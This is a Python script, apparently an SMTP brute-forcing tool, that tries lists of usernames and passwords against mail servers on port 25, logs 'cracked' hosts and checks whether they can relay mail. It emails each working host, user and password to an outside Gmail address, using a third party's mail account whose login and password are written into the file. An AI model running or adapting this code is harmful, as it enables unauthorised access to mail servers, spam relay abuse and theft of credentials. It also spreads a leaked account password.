import socket
import sys
import base64
import threading
import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import logging
from datetime import datetime, timedelta
import json
import os

# --- SMTP CONFIGURATION (EDIT THESE) ---
SMTP_SERVER = "mail.museums.or.ke"
SMTP_PORT = 587
SMTP_USER = "okioko@museums.or.ke"
SMTP_PASS = "onesmus@2022"
NOTIFY_EMAIL = "skkho87.sm@gmail.com"
# ---------------------------------------

# --- NOTIFICATION SETTINGS ---
MIN_NOTIFICATION_INTERVAL = 300  # 5 minutes between notifications for same host
MAX_NOTIFICATIONS_PER_HOUR = 20  # Maximum notifications per hour
ONLY_NOTIFY_DELIVERABLE_SMTP = True  # Only notify for servers that are DELIVERABLE (live + authenticated)
# -----------------------------

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smtp_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Notification tracking
notification_tracker = {
    'last_notification_time': {},
    'hourly_count': 0,
    'hour_start': datetime.now()
}

# Load notification history if exists
notification_file = 'notification_history.json'
if os.path.exists(notification_file):
    try:
        with open(notification_file, 'r') as f:
            notification_tracker = json.load(f)
            # Convert string timestamps back to datetime objects
            for host in notification_tracker.get('last_notification_time', {}):
                notification_tracker['last_notification_time'][host] = datetime.fromisoformat(
                    notification_tracker['last_notification_time'][host]
                )
            notification_tracker['hour_start'] = datetime.fromisoformat(notification_tracker['hour_start'])
    except Exception as e:
        logger.warning(f"Could not load notification history: {e}")

def save_notification_history():
    """Save notification tracking data"""
    try:
        data = notification_tracker.copy()
        # Convert datetime objects to strings for JSON serialization
        data['last_notification_time'] = {
            host: dt.isoformat() for host, dt in data['last_notification_time'].items()
        }
        data['hour_start'] = data['hour_start'].isoformat()
        
        with open(notification_file, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Could not save notification history: {e}")

# Initialize files if 'a' argument is provided
if len(sys.argv) > 1 and str(sys.argv[1]) == 'a':
    with open('ips.txt', 'a', encoding='utf-8'):
        pass
    with open('users.txt', 'a', encoding='utf-8'):
        pass
    with open('pass.txt', 'a', encoding='utf-8'):
        pass
    logger.info("Initialized input files")
    sys.exit(1)

# Validate command line arguments
if len(sys.argv) != 4:
    print("Usage: python smtp_scanner.py <threads> <verbose> <debug>")
    print("Example: python smtp_scanner.py 10 bad d1")
    sys.exit(1)

try:
    ThreadNumber = int(sys.argv[1])
    Verbose = str(sys.argv[2])
    Dbg = str(sys.argv[3])
except ValueError:
    logger.error("Invalid thread number provided")
    sys.exit(1)

# Initialize output files
bad = open('bad.txt', 'w', encoding='utf-8')
val = open('valid.txt', 'a', encoding='utf-8')
live_servers = open('live_smtp_servers.txt', 'a', encoding='utf-8')
deliverable_smtp = open('deliverable_smtp_servers.txt', 'a', encoding='utf-8')  # File for DELIVERABLE SMTPs only

# Load already cracked hosts to avoid duplicates
cracked = []
try:
    with open('valid.txt', 'r', encoding='utf-8') as vff:
        alreadycracked = vff.read().splitlines()
        if len(alreadycracked) > 0:
            for bruted in alreadycracked:
                if ' ' in bruted:
                    cracked.append(bruted.split(" ")[0])
except FileNotFoundError:
    logger.info("No existing valid.txt file found")

# Load subdomain list
subs = []
try:
    with open('subs.txt', 'r', encoding='utf-8') as sf:
        subs = sf.read().splitlines()
except FileNotFoundError:
    logger.warning("subs.txt not found, using default subdomain handling")
    subs = ['.com', '.org', '.net', '.edu', '.gov']

def GetDomainFromBanner(banner):
    """Extract domain from SMTP banner"""
    try:
        if banner.startswith("220 "):
            TempBanner = banner.split(" ")[1]
        elif banner.startswith("220-"):
            TempBanner = banner.split(" ")[0].split("220-")[1]
        else:
            TempBanner = banner
        
        FirstDomain = TempBanner.rstrip()
        
        # Check for known subdomains
        for sd in subs:
            if FirstDomain.endswith(sd):
                LastDomain = ".".join(FirstDomain.split(".")[-3:])
                return LastDomain
        
        # Default to last two parts
        LastDomain = ".".join(FirstDomain.split(".")[-2:])
        return LastDomain
    except Exception as e:
        logger.error(f"Error parsing banner: {e}")
        return "unknown.domain"

def can_send_notification(host):
    """Check if we can send notification based on rate limiting"""
    now = datetime.now()
    
    # Reset hourly counter if needed
    if now - notification_tracker['hour_start'] > timedelta(hours=1):
        notification_tracker['hourly_count'] = 0
        notification_tracker['hour_start'] = now
    
    # Check hourly limit
    if notification_tracker['hourly_count'] >= MAX_NOTIFICATIONS_PER_HOUR:
        logger.warning("Hourly notification limit reached")
        return False
    
    # Check per-host interval
    if host in notification_tracker['last_notification_time']:
        time_since_last = now - notification_tracker['last_notification_time'][host]
        if time_since_last.total_seconds() < MIN_NOTIFICATION_INTERVAL:
            logger.debug(f"Too soon to notify about {host} again")
            return False
    
    return True

def send_email_notification(subject, body, host):
    """Send email notification for deliverable SMTP servers only"""
    if not can_send_notification(host):
        return False
    
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f"[DELIVERABLE SMTP] {subject}"
        msg['From'] = SMTP_USER
        msg['To'] = NOTIFY_EMAIL
        
        # Add timestamp and scanner info to body
        enhanced_body = f"""DELIVERABLE SMTP Server Alert
===================================

{body}

Scanner Details:
- Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Scanner Host: {socket.gethostname()}
- Thread Count: {ThreadNumber}
- Status: DELIVERABLE (Live + Authenticated)

This server is ready for email delivery operations.
This is an automated notification from your SMTP scanner.
"""
        
        msg.attach(MIMEText(enhanced_body, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
        server.quit()
        
        # Update tracking
        notification_tracker['last_notification_time'][host] = datetime.now()
        notification_tracker['hourly_count'] += 1
        save_notification_history()
        
        logger.info(f"DELIVERABLE SMTP notification sent: {subject}")
        return True
    except Exception as e:
        logger.error(f"Failed to send email notification: {e}")
        return False

def check_smtp_live(host, timeout=10):
    """Check if SMTP server is live and responding"""
    try:
        S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        S.settimeout(timeout)
        S.connect((host, 25))
        banner = S.recv(1024).decode(errors='ignore')
        S.close()
        
        if banner[:3] == '220':
            return True, banner.strip()
        return False, banner.strip()
    except Exception as e:
        return False, str(e)

def validate_smtp_server(host, timeout=15):
    """Perform more thorough SMTP server validation"""
    try:
        S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        S.settimeout(timeout)
        S.connect((host, 25))
        
        # Read banner
        banner = S.recv(1024).decode(errors='ignore')
        if banner[:3] != '220':
            S.close()
            return False, "Invalid banner response"
        
        # Test EHLO
        S.send(b'EHLO scanner-test\r\n')
        ehlo_response = S.recv(2048).decode(errors='ignore')
        
        # Test QUIT
        S.send(b'QUIT\r\n')
        S.recv(256)
        S.close()
        
        if '250' in ehlo_response:
            return True, f"Banner: {banner.strip()}, EHLO: OK"
        else:
            return False, f"EHLO failed: {ehlo_response.strip()}"
            
    except Exception as e:
        return False, str(e)

def test_email_delivery(host, user, password):
    """Test if the SMTP server can actually deliver emails"""
    try:
        # Create a test connection
        server = smtplib.SMTP(host, 25)
        server.starttls()
        server.login(user, password)
        
        # Try to initiate a mail transaction (without actually sending)
        test_sender = user
        test_recipient = "test@example.com"
        
        # MAIL FROM command
        server.mail(test_sender)
        
        # RCPT TO command (this might fail, but we just want to test the capability)
        try:
            server.rcpt(test_recipient)
            delivery_capable = True
        except smtplib.SMTPRecipientsRefused:
            # This is expected for invalid recipients, but server accepts mail commands
            delivery_capable = True
        except Exception:
            delivery_capable = False
        
        server.quit()
        return delivery_capable
        
    except Exception as e:
        logger.debug(f"Email delivery test failed for {host}: {e}")
        return False

class SMTPScanner(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            Host, user, passwd = self.queue.get()
            self.scan_host(Host, user, passwd)
            self.queue.task_done()

    def scan_host(self, host, user, passwd):
        try:
            # Skip if already processed
            if host in cracked:
                return False

            # First, check if SMTP server is live and properly responding
            is_valid, validation_info = validate_smtp_server(host)
            
            if not is_valid:
                if Verbose == 'bad':
                    bad.write(f"{host} - {validation_info}\n")
                    bad.flush()
                return False
            
            # Log live server (but don't notify - only notify for deliverable)
            live_servers.write(f"{host} - {validation_info}\n")
            live_servers.flush()
            
            if Dbg in ["d1", "d3", "d4"]:
                print(f"[LIVE] {host} - {validation_info}")

            # Now attempt authentication if credentials provided
            if user and passwd:
                auth_result, auth_details = self.test_authentication(host, user, passwd, validation_info)
                if auth_result:
                    cracked.append(host)
                    
                    # Test if this server can actually deliver emails
                    can_deliver = test_email_delivery(host, auth_details['user'], auth_details['password'])
                    
                    if can_deliver:
                        # This is a DELIVERABLE SMTP - log it and send notification
                        delivery_status = "DELIVERABLE (Live + Authenticated + Delivery Capable)"
                        
                        deliverable_smtp.write(f"{host} {auth_details['user']} {auth_details['password']} - {validation_info} - {delivery_status}\n")
                        deliverable_smtp.flush()
                        
                        # Also log to valid.txt for compatibility
                        val.write(f"{host} {auth_details['user']} {auth_details['password']}\n")
                        val.flush()
                        
                        # Send notification ONLY for deliverable SMTPs
                        if ONLY_NOTIFY_DELIVERABLE_SMTP:
                            subject = f"DELIVERABLE SMTP Found: {host}"
                            body = f"""Host: {host}
User: {auth_details['user']}
Password: {auth_details['password']}
Validation: {validation_info}
Status: {delivery_status}

This SMTP server is ready for email delivery operations."""
                            
                            send_email_notification(subject, body, host)
                        
                        logger.info(f"DELIVERABLE SMTP found: {host}")
                    else:
                        # Authenticated but not delivery capable
                        logger.info(f"Authenticated but not deliverable: {host}")
                        val.write(f"{host} {auth_details['user']} {auth_details['password']} - NOT DELIVERABLE\n")
                        val.flush()
                    
                    return True
            
            return True
            
        except Exception as e:
            if Dbg in ["d2", "d3"]:
                logger.error(f"Error scanning {host}: {e}")
            return False

    def test_authentication(self, host, user, passwd, validation_info):
        """Test SMTP authentication"""
        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            S.settimeout(15)
            S.connect((host, 25))
            
            # Read banner
            banner_response = S.recv(1024).decode(errors='ignore')
            if banner_response[:3] != '220':
                S.close()
                return False, {}

            # Send EHLO
            S.send(b'EHLO scanner\r\n')
            data = S.recv(2048).decode(errors='ignore')
            if '250' not in data:
                S.send(b'QUIT\r\n')
                S.close()
                return False, {}

            # Get domain from banner
            dom = GetDomainFromBanner(banner_response)
            userd = f"{user}@{dom}"
            
            # Try each password
            for pwd in passwd.split("|"):
                pwd2 = pwd
                if "%user%" in pwd:
                    pwd2 = pwd.replace("%user%", user)
                if "%User%" in pwd:
                    pwd2 = pwd.replace("%User%", user.title())
                
                # Reset connection
                S.send(b'RSET\r\n')
                S.recv(256)
                
                # Attempt AUTH LOGIN
                S.send(b'AUTH LOGIN\r\n')
                data = S.recv(256).decode(errors='ignore')
                if data[:3] != '334':
                    continue
                
                if Dbg in ["d1", "d3"]:
                    print(f"[AUTH] Testing {host} {userd} {pwd2}")

                # Send username
                S.send(base64.b64encode(userd.rstrip().encode()) + b'\r\n')
                S.recv(256)
                
                # Send password
                S.send(base64.b64encode(pwd2.encode()) + b'\r\n')
                data = S.recv(256).decode(errors='ignore')
                
                if data[:3] == '235':
                    # Authentication successful
                    logger.info(f"Valid credentials found: {host} {userd} {pwd2}")
                    
                    S.send(b'QUIT\r\n')
                    S.close()
                    
                    return True, {
                        'user': userd,
                        'password': pwd2,
                        'banner': banner_response.strip(),
                        'validation': validation_info
                    }
            
            S.send(b'QUIT\r\n')
            S.close()
            return False, {}
            
        except Exception as e:
            logger.error(f"Authentication test failed for {host}: {e}")
            return False, {}

def main(users, passwords, thread_number):
    """Main scanning function"""
    logger.info(f"Starting SMTP scanner with {thread_number} threads")
    logger.info(f"Notification mode: DELIVERABLE SMTPs only (Live + Authenticated + Delivery Capable)")
    
    q = queue.Queue(maxsize=40000)
    
    # Start worker threads
    for i in range(thread_number):
        try:
            t = SMTPScanner(q)
            t.daemon = True
            t.start()
        except Exception as e:
            logger.error(f"Couldn't start {thread_number} threads! Started {i} instead!")
            break
    
    # Load hosts and add to queue
    try:
        with open('ips.txt', 'r', encoding='utf-8') as hosts_file:
            hosts = hosts_file.read().splitlines()
            
        total_combinations = len(hosts) * len(users) * len(passwords)
        logger.info(f"Processing {total_combinations} combinations across {len(hosts)} hosts")
        
        for passwd in passwords:
            for user in users:
                for host in hosts:
                    if host.strip():  # Skip empty lines
                        q.put((host.strip(), user, passwd))
    
    except FileNotFoundError:
        logger.error("ips.txt file not found!")
        return
    
    # Wait for all tasks to complete
    q.join()
    logger.info("Scanning completed")
    
    # Send summary notification for deliverable SMTPs only
    try:
        with open('deliverable_smtp_servers.txt', 'r') as f:
            deliverable_count = len(f.readlines())
        
        if deliverable_count > 0:
            subject = f"SMTP Scan Complete - {deliverable_count} DELIVERABLE Servers Found"
            body = f"""Scan Summary:
- Total DELIVERABLE SMTP servers: {deliverable_count}
- Thread count used: {thread_number}
- Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

DELIVERABLE = Live + Authenticated + Email Delivery Capable

Check deliverable_smtp_servers.txt for full details."""
            send_email_notification(subject, body, "summary")
        else:
            logger.info("No deliverable SMTP servers found in this scan")
    except Exception as e:
        logger.error(f"Could not send summary notification: {e}")

if __name__ == "__main__":
    # Load input files
    try:
        with open('users.txt', 'r', encoding='utf-8') as uf:
            users = [line.strip() for line in uf.read().splitlines() if line.strip()]
        
        with open('pass.txt', 'r', encoding='utf-8') as pf:
            passwords = [line.strip() for line in pf.read().splitlines() if line.strip()]
        
        if not users:
            logger.warning("No users loaded, using empty user for live server detection only")
            users = ['']
        
        if not passwords:
            logger.warning("No passwords loaded, using empty password for live server detection only")
            passwords = ['']
        
        logger.info(f"Loaded {len(users)} users and {len(passwords)} passwords")
        
        # Start main scanning
        main(users, passwords, ThreadNumber)
        
    except FileNotFoundError as e:
        logger.error(f"Required file not found: {e}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    finally:
        # Close file handles
        bad.close()
        val.close()
        live_servers.close()
        deliverable_smtp.close()
        save_notification_history()